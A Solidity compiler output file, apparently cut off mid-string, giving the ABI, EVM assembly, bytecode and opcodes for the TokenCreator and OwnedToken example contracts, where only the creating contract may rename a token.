{
	"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC": {
		"TokenCreator": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "contract OwnedToken",
							"name": "tokenAddress",
							"type": "address"
						},
						{
							"internalType": "bytes32",
							"name": "name",
							"type": "bytes32"
						}
					],
					"name": "changeName",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [
						{
							"internalType": "bytes32",
							"name": "name",
							"type": "bytes32"
						}
					],
					"name": "createToken",
					"outputs": [
						{
							"internalType": "contract OwnedToken",
							"name": "tokenAddress",
							"type": "address"
						}
					],
					"stateMutability": "nonpayable",
					"type": "function"
				}
			],
			"devdoc": {
				"methods": {}
			},
			"evm": {
				"assembly": "    /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":7173:8998  contract TokenCreator {\r... */\n  mstore(0x40, 0x80)\n  callvalue\n    /* \"--CODEGEN--\":5:14   */\n  dup1\n    /* \"--CODEGEN--\":2:4   */\n  iszero\n  tag_1\n  jumpi\n    /* \"--CODEGEN--\":27:28   */\n  0x00\n    /* \"--CODEGEN--\":24:25   */\n  dup1\n    /* \"--CODEGEN--\":17:29   */\n  revert\n    /* \"--CODEGEN--\":2:4   */\ntag_1:\n    /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":7173:8998  contract TokenCreator {\r... */\n  pop\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":7173:8998  contract TokenCreator {\r... */\n      mstore(0x40, 0x80)\n      callvalue\n        /* \"--CODEGEN--\":5:14   */\n      dup1\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_1\n      jumpi\n        /* \"--CODEGEN--\":27:28   */\n      0x00\n        /* \"--CODEGEN--\":24:25   */\n      dup1\n        /* \"--CODEGEN--\":17:29   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_1:\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":7173:8998  contract TokenCreator {\r... */\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x7379b422\n      eq\n      tag_3\n      jumpi\n      dup1\n      0xae3edb65\n      eq\n      tag_4\n      jumpi\n    tag_2:\n        /* \"--CODEGEN--\":12:13   */\n      0x00\n        /* \"--CODEGEN--\":9:10   */\n      dup1\n        /* \"--CODEGEN--\":2:14   */\n      revert\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":7748:8172  function changeName(OwnedToken tokenAddress, bytes32 name)  public {\r... */\n    tag_3:\n      tag_5\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":15:17   */\n      0x40\n        /* \"--CODEGEN--\":10:13   */\n      dup2\n        /* \"--CODEGEN--\":7:18   */\n      lt\n        /* \"--CODEGEN--\":4:6   */\n      iszero\n      tag_6\n      jumpi\n        /* \"--CODEGEN--\":31:32   */\n      0x00\n        /* \"--CODEGEN--\":28:29   */\n      dup1\n        /* \"--CODEGEN--\":21:33   */\n      revert\n        /* \"--CODEGEN--\":4:6   */\n    tag_6:\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":7748:8172  function changeName(OwnedToken tokenAddress, bytes32 name)  public {\r... */\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      calldataload\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      dup1\n      calldataload\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      tag_7\n      jump\t// in\n    tag_5:\n      stop\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":7202:7740  function createToken(bytes32 name)\r... */\n    tag_4:\n      tag_8\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":15:17   */\n      0x20\n        /* \"--CODEGEN--\":10:13   */\n      dup2\n        /* \"--CODEGEN--\":7:18   */\n      lt\n        /* \"--CODEGEN--\":4:6   */\n      iszero\n      tag_9\n      jumpi\n        /* \"--CODEGEN--\":31:32   */\n      0x00\n        /* \"--CODEGEN--\":28:29   */\n      dup1\n        /* \"--CODEGEN--\":21:33   */\n      revert\n        /* \"--CODEGEN--\":4:6   */\n    tag_9:\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":7202:7740  function createToken(bytes32 name)\r... */\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      calldataload\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      tag_10\n      jump\t// in\n    tag_8:\n      mload(0x40)\n      dup1\n      dup3\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":7748:8172  function changeName(OwnedToken tokenAddress, bytes32 name)  public {\r... */\n    tag_7:\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":8135:8147  tokenAddress */\n      dup2\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":8135:8158  tokenAddress.changeName */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x898855ed\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":8159:8163  name */\n      dup3\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":8135:8164  tokenAddress.changeName(name) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup3\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":5:14   */\n      dup1\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_12\n      jumpi\n        /* \"--CODEGEN--\":27:28   */\n      0x00\n        /* \"--CODEGEN--\":24:25   */\n      dup1\n        /* \"--CODEGEN--\":17:29   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_12:\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":8135:8164  tokenAddress.changeName(name) */\n      pop\n      gas\n      call\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_14\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_14:\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":8135:8164  tokenAddress.changeName(name) */\n      pop\n      pop\n      pop\n      pop\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":7748:8172  function changeName(OwnedToken tokenAddress, bytes32 name)  public {\r... */\n      pop\n      pop\n      jump\t// out\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":7202:7740  function createToken(bytes32 name)\r... */\n    tag_10:\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":7269:7292  OwnedToken tokenAddress */\n      0x00\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":7727:7731  name */\n      dup2\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":7712:7732  new OwnedToken(name) */\n      mload(0x40)\n      tag_16\n      swap1\n      tag_17\n      jump\t// in\n    tag_16:\n      dup1\n      dup3\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      0x00\n      create\n      dup1\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_18\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_18:\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":7712:7732  new OwnedToken(name) */\n      pop\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":7705:7732  return new OwnedToken(name) */\n      swap1\n      pop\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":7202:7740  function createToken(bytes32 name)\r... */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":7173:8998  contract TokenCreator {\r... */\n    tag_17:\n      dataSize(sub_0)\n      dup1\n      dataOffset(sub_0)\n      dup4\n      codecopy\n      add\n      swap1\n      jump\t// out\n    stop\n\n    sub_0: assembly {\n            /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":3889:6975  contract OwnedToken {\r... */\n          mstore(0x40, 0x80)\n            /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":4481:5183  constructor(bytes32 _name) public{\r... */\n          callvalue\n            /* \"--CODEGEN--\":5:14   */\n          dup1\n            /* \"--CODEGEN--\":2:4   */\n          iszero\n          tag_1\n          jumpi\n            /* \"--CODEGEN--\":27:28   */\n          0x00\n            /* \"--CODEGEN--\":24:25   */\n          dup1\n            /* \"--CODEGEN--\":17:29   */\n          revert\n            /* \"--CODEGEN--\":2:4   */\n        tag_1:\n            /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":4481:5183  constructor(bytes32 _name) public{\r... */\n          pop\n          mload(0x40)\n          sub(codesize, bytecodeSize)\n          dup1\n          bytecodeSize\n          dup4\n          codecopy\n          dup2\n          dup2\n          add\n          0x40\n          mstore\n            /* \"--CODEGEN--\":15:17   */\n          0x20\n            /* \"--CODEGEN--\":10:13   */\n          dup2\n            /* \"--CODEGEN--\":7:18   */\n          lt\n            /* \"--CODEGEN--\":4:6   */\n          iszero\n          tag_2\n          jumpi\n            /* \"--CODEGEN--\":31:32   */\n          0x00\n            /* \"--CODEGEN--\":28:29   */\n          dup1\n            /* \"--CODEGEN--\":21:33   */\n          revert\n            /* \"--CODEGEN--\":4:6   */\n        tag_2:\n            /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":4481:5183  constructor(bytes32 _name) public{\r... */\n          dup2\n          add\n          swap1\n          dup1\n          dup1\n          mload\n          swap1\n          0x20\n          add\n          swap1\n          swap3\n          swap2\n          swap1\n          pop\n          pop\n          pop\n            /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":4716:4726  msg.sender */\n          caller\n            /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":4708:4713  owner */\n          0x01\n          0x00\n            /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":4708:4726  owner = msg.sender */\n          0x0100\n          exp\n          dup2\n          sload\n          dup2\n          0xffffffffffffffffffffffffffffffffffffffff\n          mul\n          not\n          and\n          swap1\n          dup4\n          0xffffffffffffffffffffffffffffffffffffffff\n          and\n          mul\n          or\n          swap1\n          sstore\n          pop\n            /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":5141:5151  msg.sender */\n          caller\n            /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":5118:5125  creator */\n          0x00\n          dup1\n            /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":5118:5152  creator = TokenCreator(msg.sender) */\n          0x0100\n          exp\n          dup2\n          sload\n          dup2\n          0xffffffffffffffffffffffffffffffffffffffff\n          mul\n          not\n          and\n          swap1\n          dup4\n          0xffffffffffffffffffffffffffffffffffffffff\n          and\n          mul\n          or\n          swap1\n          sstore\n          pop\n            /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":5170:5175  _name */\n          dup1\n            /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":5163:5167  name */\n          0x02\n            /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":5163:5175  name = _name */\n          dup2\n          swap1\n          sstore\n          pop\n            /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":4481:5183  constructor(bytes32 _name) public{\r... */\n          pop\n            /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":3889:6975  contract OwnedToken {\r... */\n          dataSize(sub_0)\n          dup1\n          dataOffset(sub_0)\n          0x00\n          codecopy\n          0x00\n          return\n        stop\n\n        sub_0: assembly {\n                /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":3889:6975  contract OwnedToken {\r... */\n              mstore(0x40, 0x80)\n              callvalue\n                /* \"--CODEGEN--\":5:14   */\n              dup1\n                /* \"--CODEGEN--\":2:4   */\n              iszero\n              tag_1\n              jumpi\n                /* \"--CODEGEN--\":27:28   */\n              0x00\n                /* \"--CODEGEN--\":24:25   */\n              dup1\n                /* \"--CODEGEN--\":17:29   */\n              revert\n                /* \"--CODEGEN--\":2:4   */\n            tag_1:\n                /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":3889:6975  contract OwnedToken {\r... */\n              pop\n              jumpi(tag_2, lt(calldatasize, 0x04))\n              shr(0xe0, calldataload(0x00))\n              dup1\n              0x898855ed\n              eq\n              tag_3\n              jumpi\n            tag_2:\n                /* \"--CODEGEN--\":12:13   */\n              0x00\n                /* \"--CODEGEN--\":9:10   */\n              dup1\n                /* \"--CODEGEN--\":2:14   */\n              revert\n                /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":5191:6090  function changeName(bytes32 newName) public {\r... */\n            tag_3:\n              tag_4\n              0x04\n              dup1\n              calldatasize\n              sub\n                /* \"--CODEGEN--\":15:17   */\n              0x20\n                /* \"--CODEGEN--\":10:13   */\n              dup2\n                /* \"--CODEGEN--\":7:18   */\n              lt\n                /* \"--CODEGEN--\":4:6   */\n              iszero\n              tag_5\n              jumpi\n                /* \"--CODEGEN--\":31:32   */\n              0x00\n                /* \"--CODEGEN--\":28:29   */\n              dup1\n                /* \"--CODEGEN--\":21:33   */\n              revert\n                /* \"--CODEGEN--\":4:6   */\n            tag_5:\n                /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":5191:6090  function changeName(bytes32 newName) public {\r... */\n              dup2\n              add\n              swap1\n              dup1\n              dup1\n              calldataload\n              swap1\n              0x20\n              add\n              swap1\n              swap3\n              swap2\n              swap1\n              pop\n              pop\n              pop\n              tag_6\n              jump\t// in\n            tag_4:\n              stop\n            tag_6:\n                /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":6045:6052  creator */\n              0x00\n              dup1\n              swap1\n              sload\n              swap1\n              0x0100\n              exp\n              swap1\n              div\n              0xffffffffffffffffffffffffffffffffffffffff\n              and\n                /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":6023:6053  msg.sender == address(creator) */\n              0xffffffffffffffffffffffffffffffffffffffff\n              and\n                /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":6023:6033  msg.sender */\n              caller\n                /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":6023:6053  msg.sender == address(creator) */\n              0xffffffffffffffffffffffffffffffffffffffff\n              and\n              eq\n                /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":6019:6082  if (msg.sender == address(creator))\r... */\n              iszero\n              tag_8\n              jumpi\n                /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":6075:6082  newName */\n              dup1\n                /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":6068:6072  name */\n              0x02\n                /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":6068:6082  name = newName */\n              dup2\n              swap1\n              sstore\n              pop\n                /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":6019:6082  if (msg.sender == address(creator))\r... */\n            tag_8:\n                /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":5191:6090  function changeName(bytes32 newName) public {\r... */\n              pop\n              jump\t// out\n\n            auxdata: 0xa2646970667358221220864d2a7e09ec20b0c7c8c3c0390a6b726157753699d41d18ac2b760eb64d189664736f6c63430006060033\n        }\n    }\n\n    auxdata: 0xa26469706673582212200798ef6c2224810a3ce6b71d9d412a3b615920e2a8be6ac43de865fe3660fa6464736f6c63430006060033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "608060405234801561001057600080fd5b506103ae806100206000396000f3fe608060405234801561001057600080fd5b50600436106100365760003560e01c80637379b4221461003b578063ae3edb6514610089575b600080fd5b6100876004803603604081101561005157600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803590602001909291905050506100f7565b005b6100b56004803603602081101561009f57600080fd5b8101908080359060200190929190505050610166565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b8173ffffffffffffffffffffffffffffffffffffffff1663898855ed826040518263ffffffff1660e01b815260040180828152602001915050600060405180830381600087803b15801561014a57600080fd5b505af115801561015e573d6000803e3d6000fd5b505050505050565b600081604051610175906101a3565b80828152602001915050604051809103906000f08015801561019b573d6000803e3d6000fd5b509050919050565b6101c8806101b18339019056fe608060405234801561001057600080fd5b506040516101c83803806101c88339818101604052602081101561003357600080fd5b810190808051906020019092919050505033600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550806002819055505060ed806100db6000396000f3fe6080604052348015600f57600080fd5b506004361060285760003560e01c8063898855ed14602d575b600080fd5b605660048036036020811015604157600080fd5b81019080803590602001909291905050506058565b005b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16141560b457806002819055505b5056fea2646970667358221220864d2a7e09ec20b0c7c8c3c0390a6b726157753699d41d18ac2b760eb64d189664736f6c63430006060033a26469706673582212200798ef6c2224810a3ce6b71d9d412a3b615920e2a8be6ac43de865fe3660fa6464736f6c63430006060033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x3AE DUP1 PUSH2 0x20 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x36 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x7379B422 EQ PUSH2 0x3B JUMPI DUP1 PUSH4 0xAE3EDB65 EQ PUSH2 0x89 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x87 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x51 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0xF7 JUMP JUMPDEST STOP JUMPDEST PUSH2 0xB5 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x9F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x166 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x898855ED DUP3 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x14A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x15E JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 PUSH1 0x40 MLOAD PUSH2 0x175 SWAP1 PUSH2 0x1A3 JUMP JUMPDEST DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 PUSH1 0x0 CREATE DUP1 ISZERO DUP1 ISZERO PUSH2 0x19B JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x1C8 DUP1 PUSH2 0x1B1 DUP4 CODECOPY ADD SWAP1 JUMP INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x1C8 CODESIZE SUB DUP1 PUSH2 0x1C8 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x33 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP CALLER PUSH1 0x1 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP CALLER PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP DUP1 PUSH1 0x2 DUP2 SWAP1 SSTORE POP POP PUSH1 0xED DUP1 PUSH2 0xDB PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH1 0xF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH1 0x28 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x898855ED EQ PUSH1 0x2D JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x56 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH1 0x41 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH1 0x58 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH1 0xB4 JUMPI DUP1 PUSH1 0x2 DUP2 SWAP1 